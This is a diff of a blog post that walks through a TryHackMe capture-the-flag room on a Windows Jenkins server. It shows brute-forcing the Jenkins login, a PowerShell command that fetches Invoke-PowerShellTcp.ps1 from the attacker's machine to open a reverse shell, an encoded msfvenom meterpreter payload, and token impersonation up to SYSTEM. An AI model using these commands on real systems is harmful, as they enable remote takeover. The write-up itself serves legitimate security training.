@@ -17,7 +17,8 @@ Aug. 16, 2020
 </ul>
 <p>Ok once you have that tool downloaded to your system we can get started. Let&rsquo;s go question by question as designed for this THM box.</p>
 <blockquote>
-<p>Question #1: How many ports are open?</p></blockquote>
+<p>Question #1: How many ports are open?</p>
+</blockquote>
 <p>Ok so for this question we&rsquo;ll run <strong>Nmap</strong> to enumerate any open ports. It is important to note that the room description mentions this machine <strong>won&rsquo;t respond to ping (ICMP)</strong> requests. So we&rsquo;ll need to add a switch to deal with that when running our scan.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo nmap -A -Pn -p- 10.10.177.5
 </span></span></code></pre></div><p>We&rsquo;ll use the switch/flag <strong>-Pn</strong> to avoid <strong>Nmap</strong> doing a ping before starting the scans. Also we use <strong>-p-</strong> to scan for all the ports  instead of the most common ones.</p>
@@ -54,7 +55,8 @@ Aug. 16, 2020
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 558.59 seconds
 </span></span></code></pre></div><p>Ok, so based on these results we now know how many ports are open.</p>
 <blockquote>
-<p>Question #2: What is the username and password for the login panel(in the format username:password)?</p></blockquote>
+<p>Question #2: What is the username and password for the login panel(in the format username:password)?</p>
+</blockquote>
 <p>Ok let&rsquo;s start by seeing what is being served in the port <strong>80</strong> of this machine.</p>
 <p><img src="https://i.imgur.com/FK0zWJh.png" alt="enter image description here">
 Ok so we get an email <em><strong>﻿alfred@wayneenterprises.com</strong></em>, and a picture. Let&rsquo;s see if we get any other useful information by inspecting the <strong>DOM</strong>.</p>
@@ -90,7 +92,8 @@ Ok so we get a login form, we might as well try out some basic user:password com
 <p>To start let&rsquo;s launch <strong>Burp Suite</strong>, we&rsquo;ll be using the integrated browser to navigate the site and review the details of the login request it gets sent when we attempt to log into Jenkins.</p>
 <p><img src="https://i.imgur.com/SBakfmQ.png" alt="Burp Suite"></p>
 <blockquote>
-<p><em>NOTE:</em> If you get an error about the integrated browser not able to run due to sandboxed settings. Got to Project Options -&gt; Misc -&gt; Check &ldquo;allow the embedded browser to run without a sandbox&rdquo;.</p></blockquote>
+<p><em>NOTE:</em> If you get an error about the integrated browser not able to run due to sandboxed settings. Got to Project Options -&gt; Misc -&gt; Check &ldquo;allow the embedded browser to run without a sandbox&rdquo;.</p>
+</blockquote>
 <p>Once you have Burp running in the <strong>Proxy -&gt; Intercept</strong> tab click on <strong>Open Browser</strong>. In the new Browser window open the machine IP at port 8080 to load the Jenkins login form.</p>
 <ul>
 <li>Remember to add the target IP to Burp&rsquo;s Scope, so it doesn&rsquo;t stop every single request from non-target related IPs.</li>
@@ -137,7 +140,8 @@ As we can see in the intercepted request we get the rest of the pieces we were l
 </span></span></code></pre></div><p>So that gives us the answer to Question #2 in a brute-forced way.</p>
 <p>Let&rsquo;s move to the next objective.</p>
 <blockquote>
-<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-IP -Port your-port</em></strong></p></blockquote>
+<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-IP -Port your-port</em></strong></p>
+</blockquote>
 <p>Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let&rsquo;s take a look at what can we do in our Jenkins admin panel.</p>
 <p>If we take a look at the existing jobs in the server, we see this job called <strong>project</strong> which was last run months ago, but it also ran successfully.</p>
 <p><img src="https://i.imgur.com/cilmo5K.png" alt="Running Job on the server">
@@ -159,7 +163,8 @@ We navigate to the <strong>Shells</strong> folder and fire up our server like th
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 </span></span></code></pre></div><p>We need to change the <strong>IP and Port</strong>  and also make sure we specify a port value for our reverse shell. So this full command would attempt to connect to our local server to get the PS script and then open a reverse shell on a specific port to connect to our local listener(we&rsquo;ll do that in a bit).</p>
 <blockquote>
-<p><strong>Remember to get your correct IP when connected to THMs VPN. It is usually tun0. Run <em>ip add</em> command to see your IP.</strong></p></blockquote>
+<p><strong>Remember to get your correct IP when connected to THMs VPN. It is usually tun0. Run <em>ip add</em> command to see your IP.</strong></p>
+</blockquote>
 <p>In my case the command will look like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.13.0.34:8000/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress <span style="color:#ae81ff">10.13</span>.0.34 -Port <span style="color:#ae81ff">6666</span>
 </span></span></code></pre></div><p>We have the command ready, we are just missing one tiny crucial part. We need to open a local listener on port 666 so our exploit can successfully open a reverse shell. Let&rsquo;s do that.</p>
@@ -200,12 +205,14 @@ We see that our local server has received a request to serve a file, this seems 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>and-we-finally-get-the-flag-value<span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer question number 4.</p>
 <blockquote>
-<p>As it turns out we didn&rsquo;t need any <strong>GoBuster</strong> scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.</p></blockquote>
+<p>As it turns out we didn&rsquo;t need any <strong>GoBuster</strong> scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.</p>
+</blockquote>
 <h2 id="task-2---switching-shells">[Task 2] - Switching shells</h2>
 <p>In this section we&rsquo;ll see how to leverage <strong>meterpreter</strong> to aid our privilege escalation attempts.</p>
 <p>In this section there is not much to add, as the room really provides almost all you need to answer the only question asked:</p>
 <blockquote>
-<p>Question: What is the final size of the exe payload that you generated?</p></blockquote>
+<p>Question: What is the final size of the exe payload that you generated?</p>
+</blockquote>
 <p>Ok so we&rsquo;ll be using <strong>msfvenom</strong> to generate a payload.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=[</span>PORT<span style="color:#f92672">]</span> -f exe -o <span style="color:#f92672">[</span>SHELL NAME<span style="color:#f92672">]</span>.exe
 </span></span></code></pre></div><p>We need to replace <strong>[IP], [PORT] and [SHELL NAME]</strong></p>
@@ -281,7 +288,8 @@ We see that our local server has received a request to serve a file, this seems 
 </span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
 </span></span></code></pre></div><p>As we can see, we just need to set <strong>[LHOST]</strong> and <strong>[LPORT]</strong> to the right values, let&rsquo;s do that.  And type in <strong>exploit</strong> or <strong>run</strong> to start our <strong>Metasploit listener/handler</strong>.</p>
 <blockquote>
-<p>Make sure to set the <strong>[LPORT]</strong> to the port you specified when creating the <strong>payload.exe</strong> with <strong>msfvenom</strong>.</p></blockquote>
+<p>Make sure to set the <strong>[LPORT]</strong> to the port you specified when creating the <strong>payload.exe</strong> with <strong>msfvenom</strong>.</p>
+</blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 10.13.0.34
 </span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
 </span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">6555</span>
@@ -436,7 +444,8 @@ Save the changes and again, trigger a new build as we did before. But unlike the
 </span></span></code></pre></div><p>As we can see we successfully managed to impersonate <strong>NT AUTHORITY\SYSTEM</strong>.</p>
 <p>Now we can answer the room&rsquo;s question:</p>
 <blockquote>
-<p>Question #3: What is the output when you run the <em>getuid</em> command?</p></blockquote>
+<p>Question #3: What is the output when you run the <em>getuid</em> command?</p>
+</blockquote>
 <p>Even though we managed to impersonate successfully, this actually won&rsquo;t allow us to fully have the permissions of a privileged  user. So, we need to fix that.</p>
 <p>We can try to migrate our process to any other that is running with higher privileges, for that we&rsquo;ll use the <strong>ps</strong> command to get the list of running processes and identify one that suits our needs and finally <strong>migrate PID</strong> to migrate to such process.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ps
@@ -493,7 +502,8 @@ Save the changes and again, trigger a new build as we did before. But unlike the
 </span></span></code></pre></div><p>Yay! we did it, we migrated to a privileged process successfully.</p>
 <p>Let&rsquo;s see what is the last question or objective of this room</p>
 <blockquote>
-<p>Question #5: <strong>read the root.txt file at C:\Windows\System32\config</strong></p></blockquote>
+<p>Question #5: <strong>read the root.txt file at C:\Windows\System32\config</strong></p>
+</blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
 </span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">2728</span> created.
 </span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
